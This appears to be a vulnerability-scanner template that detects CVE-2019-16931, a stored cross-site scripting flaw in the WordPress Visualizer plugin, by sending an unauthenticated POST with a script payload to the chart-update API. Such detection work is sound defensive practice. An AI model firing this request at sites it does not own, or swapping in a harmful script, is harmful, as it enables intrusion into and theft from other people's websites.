http:
- matchers:
  - part: body
    type: word
    words:
    - '{"success":"Chart updated"}'
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-json/visualizer/v1/update-chart HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"id": 7, "visualizer-chart-type": "<script>alert(document.domain)</script>"}

    '
id: CVE-2019-16931
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:themeisle:visualizer:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2019-16931
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.83146
    epss-score: 0.01991
  description: 'WordPress Visualizer plugin before 3.3.1 contains a stored cross-site
    scripting vulnerability via /wp-json/visualizer/v1/update-chart WP-JSON API endpoint.
    An unauthenticated attacker can execute arbitrary JavaScript when an admin or
    other privileged user edits the chart via the admin dashboard.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: visualizer
    vendor: themeisle
    verified: true
  name: WordPress Visualizer <3.3.1 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/867e000d-d2f5-4d53-89b0-41d7d4163f44
  - https://nathandavison.com/blog/wordpress-visualizer-plugin-xss-and-ssrf
  - https://wpvulndb.com/vulnerabilities/9893
  - https://nvd.nist.gov/vuln/detail/CVE-2019-16931
  - https://wordpress.org/plugins/visualizer/#developers
  remediation: 'Update to the latest version of WordPress Visualizer plugin (3.3.1)
    or apply the provided patch to fix the XSS vulnerability.

    '
  severity: medium
  tags: cve,cve2019,wp-plugin,wordpress,wp,xss,unauth,wpscan,themeisle,vuln
